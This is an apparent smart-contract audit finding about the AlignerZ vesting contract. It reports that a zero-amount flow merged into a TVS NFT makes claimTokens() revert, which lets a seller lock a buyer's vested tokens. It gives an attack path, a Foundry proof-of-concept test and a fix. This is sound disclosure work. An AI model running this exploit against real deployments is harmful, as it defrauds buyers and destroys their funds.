# [000817] Any zero amount flows will revert on claim, allowing TVS transfer grief
  
  ### Summary

A zero-flow in a TVS will cause all remaining flows to be permanently locked for buyers as sellers can merge zero-value flows before transferring the NFT on secondary markets.

### Root Cause


In `getClaimableAmountAndSeconds()` the function requires `claimableAmount > 0`, which causes `claimTokens()` to revert if any single flow has zero claimable amount.

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L980-L996

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L958

```solidity
function getClaimableAmountAndSeconds(...) {
  //...
  require(claimableAmount > 0, No_Claimable_Tokens());
  //...
}

function claimTokens(...) external {
  //...
  for (uint256 i; i < nbOfFlows; i++) {
    //...
    (
        uint256 claimableAmount,
        uint256 claimableSeconds
    ) = getClaimableAmountAndSeconds(allocation, i);
    //...
  }
  //...
}
```

The fact that TVS can be bought, sold, or traded even before vesting matures leads to griefing in trading. Before transferring the NFT, a seller can merge it with a zero-amount flow. The receiver then cannot claim tokens represented by the NFT and loses these funds permanently.

Attackers have strong incentives to execute this attack. AlignerZ attempts to change the incentive architecture of TGEs from "whoever sells faster wins" to "whoever holds longer wins" by increasing bid opportunities, discounts, extra refunds, and dividends for longer vesting. But this vulnerability turns every claimable token back to "whoever sells faster wins". Attackers lock the tokens in the NFT before transferring to the buyer, reaching the position where "they can always sell before the buyer and gain interest from liquidity provided by the buyer".

### Internal Pre-conditions

_No response_

### External Pre-conditions

TVS NFTs are traded on secondary markets (OpenSea, Blur, etc.).


### Attack Path

1. Attacker lists a normal TVS on an NFT marketplace.
2. Buyer places an order to purchase the TVS.
3. Before executing the transfer, attacker merges a zero-value flow into the TVS to poison it.
4. Attacker completes the sale and transfers the poisoned TVS to the buyer.
5. When buyer calls `claimTokens()`, it reverts due to the zero-flow, locking all flows permanently.

### Impact

- The buyer suffers a complete loss of all vested tokens in the TVS.

- This attack breaks AlignerZ's core incentive model.

- Buyers cannot verify if a TVS has been poisoned until after purchase, which create severe trust issues in the secondary NFT market.

### PoC

```
function test_poc() public {
    vm.startPrank(projectCreator);
    vesting.setVestingPeriodDivisor(1);

    // 1. Launch project
    vm.startPrank(projectCreator);
    vesting.launchBiddingProject(
        address(token),
        address(usdt),
        block.timestamp,
        block.timestamp + 1_000_000,
        "0x0",
        false
    );

    // 2. Create pool
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
    vm.stopPrank();

    // 3. Place bid
    vm.startPrank(bidders[0]);
    usdt.approve(address(vesting), BIDDER_USD);
    uint256 vestingPeriod = 30 days;
    vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
    vm.stopPrank();

    // 4. Prepare bid allocations (this would be done off-chain)
    BidInfo[] memory allBids = new BidInfo[](2);
    allBids[0] = BidInfo({
        bidder: bidders[0],
        amount: BIDDER_USD,
        vestingPeriod: vestingPeriod,
        poolId: 0,
        accepted: true
    });

    // 5. Generate merkle roots for each pool
    bytes32[] memory poolRoots = new bytes32[](1);
    poolRoots[0] = generateMerkleProofs(allBids, 0);

    // 6. Finalize project with merkle roots
    vm.prank(projectCreator);
    vesting.finalizeBids(PROJECT_ID, "0x0", poolRoots, 60);

    // 7. Users claim NFTs with proofs
    vm.prank(bidders[0]);
    uint256 nftId = vesting.claimNFT(
        PROJECT_ID,
        0,
        BIDDER_USD,
        bidderProofs[bidders[0]]
    );

    // Verify NFT ownership
    assertEq(nft.ownerOf(nftId), bidders[0]);

    // 8. There's a trade of 50% TVS of bidder[0] on secondary market
    vm.startPrank(bidders[0]);

    uint256[] memory percentages = new uint256[](3);
    percentages[0] = 5000;
    percentages[1] = 5000;
    percentages[2] = 0;
    (, uint256[] memory newNftId) = vesting.splitTVS(
        PROJECT_ID,
        percentages,
        nftId
    );

    uint256 nftIdToTransfer = newNftId[0];
    uint256[] memory projectIds = new uint256[](1);
    projectIds[0] = PROJECT_ID;
    uint256[] memory nftIdsToMerge = new uint256[](1);
    nftIdsToMerge[0] = newNftId[1];
    vesting.mergeTVS(
        PROJECT_ID,
        nftIdToTransfer,
        projectIds,
        nftIdsToMerge
    );

    nft.safeTransferFrom(bidders[0], bidders[1], nftIdToTransfer);
    vm.stopPrank();

    // 9. Fast forward more time to simulate complete vesting
    vm.warp(block.timestamp + vestingPeriod);

    // 10. Users claim remaining tokens
    vm.prank(bidders[1]);
    vm.expectRevert(AlignerzVesting.No_Claimable_Tokens.selector);
    vesting.claimTokens(PROJECT_ID, nftIdToTransfer);
}
```

### Mitigation

Remove the `require(claimableAmount > 0, No_Claimable_Tokens());` line in `getClaimableAmountAndSeconds()`.

  